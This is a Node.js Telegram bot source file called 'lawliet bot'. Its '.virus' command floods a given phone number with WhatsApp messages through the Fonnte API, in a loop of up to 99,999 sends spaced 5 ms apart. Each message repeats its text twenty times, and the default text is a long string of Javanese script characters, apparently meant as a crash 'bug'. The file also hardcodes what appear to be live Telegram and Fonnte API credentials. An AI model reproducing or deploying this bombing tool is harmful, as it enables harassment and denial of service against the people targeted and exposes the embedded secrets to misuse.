// bot_kirim2_mod.js
// npm install node-telegram-bot-api axios
const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');
const fs = require('fs');

const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN || '8499584477:AAEwTvcdjckwU_vHJ6C2dgUUfqoiKbmUFNQ';
const FONNTE_KEY    = process.env.FONNTE_KEY    || 'ctKBo8JdYJ3XqxPBD6Fg';
if(!TELEGRAM_TOKEN || !FONNTE_KEY){ console.error('Set TELEGRAM_TOKEN & FONNTE_KEY'); process.exit(1); }

const bot = new TelegramBot(TELEGRAM_TOKEN, { polling: true });
const make20 = txt => Array.from({length:20}).map(()=>txt).join('\n');
const sleep = ms => new Promise(r=>setTimeout(r,ms));

// ===== EVENT MESSAGE =====
bot.on('message', async msg=>{
  try{
    const chatId = msg.chat.id;
    const t = (msg.text||'').trim();

    // ===== PERINTAH .menu =====
    if(t === '.menu') {
      if(!fs.existsSync('./nina.jpg')) 
        return bot.sendMessage(chatId, 'Foto nina.jpg tidak ditemukan!');

      const caption = `こんにちは、私はrifatによって作られたボットlawlietです 
Dev: @rifat M rifat
name bot: lawliet bot
version:v2
いらっしゃいませ`;

      const opts = {
        reply_markup: {
          inline_keyboard: [
            [{ text: '📜 MENU BUG', callback_data: 'menu_bot' }]
          ]
        }
      };

      await bot.sendPhoto(chatId, fs.readFileSync('./nina.jpg'), { caption, ...opts });
      return;
    }

    // ===== PERINTAH .virus =====
    if(!t.startsWith('.virus')) return;
    const parts = t.split(/\s+/);
    const target = parts[1];
    const text = parts.slice(2).join(' ') || 'ꦾ'.repeat(100);

    if(!target) return bot.sendMessage(chatId,'Format: .virus 62812xxxx [isi]');

    const payloadText = make20(text);

    // kirim 20 pesan cepat
    const results = [];
    for (let i = 1; i <= 99999; i++) {
      try {
        const res = await axios.post('https://api.fonnte.com/send',
          { target: target.trim(), message: payloadText },
          { headers: { Authorization: FONNTE_KEY }, timeout: 20000 }
        );
        results.push({ i, ok: true, data: res.data });
        await bot.sendMessage(chatId, `Pesan ${i} queued: ${JSON.stringify(res.data)}`);
      } catch (e) {
        results.push({ i, ok: false, err: e?.response?.data || e.message });
        await bot.sendMessage(chatId, `Pesan ${i} gagal: ${JSON.stringify(e?.response?.data || e.message)}`);
      }
      await sleep(5);
    }

    const successCount = results.filter(r=>r.ok).length;
    bot.sendMessage(chatId, `Selesai. ${successCount}/20 pesan queued berhasil.`);

  } catch(e){
    console.error(e?.response?.data || e.message);
    bot.sendMessage(msg.chat.id, '❌ Gagal. Cek API key / koneksi.');
  }
});

// ===== CALLBACK UNTUK TOMBOL "MENU BOT" =====
bot.on('callback_query', async query => {
  const chatId = query.message.chat.id;
  const data = query.data;

  if (data === 'menu_bot') {
    if(!fs.existsSync('./mama.jpg')) 
      return bot.sendMessage(chatId, 'Foto nina.jpg tidak ditemukan!');
    
    const caption = `番号を入力して直接送信\n\nDEV:RIFAT\nV:v1\n\n送信 .virus 62××××××\nまだ受け入れる`;

    await bot.sendPhoto(chatId, fs.readFileSync('./mama.jpg'), { caption });
    await bot.answerCallbackQuery(query.id, { text: '📋 Menampilkan menu bot...' });
  }
});
